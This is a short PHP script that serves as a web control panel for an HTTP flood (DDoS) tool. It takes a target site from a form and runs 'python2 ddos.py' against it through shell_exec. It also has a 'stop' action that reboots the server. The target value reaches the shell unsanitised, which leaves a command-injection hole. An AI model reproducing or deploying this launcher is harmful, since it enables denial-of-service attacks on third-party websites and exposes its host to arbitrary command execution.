<?php
   if( $_POST["site"] ) {      
$site = $_POST["site"];
echo"<script>alert('Attacking $site')</script>";    
echo shell_exec("python2 ddos.py http://$site");
echo"<script>alert('HTTPFLOOD sent to $site')</script>";
   }

$htmlmobile = base64_decode('PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XQVBGT1JVTS8vRFREIFhIVE1MIE1vYmlsZSAxLjAvL0VOIiAiaHR0cDovL3d3dy53YXBmb3J1bS5vcmcvRFREL3hodG1sLW1vYmlsZTEwLmR0ZCI+');
if( $_POST["stop"]) {      
echo $htmlmobile;
$stop = $_POST["stop"];
echo shell_exec("reboot");
echo shell_exec("exit");
echo"<script>alert('All attacks has been stopped')</script>";
   }
?>
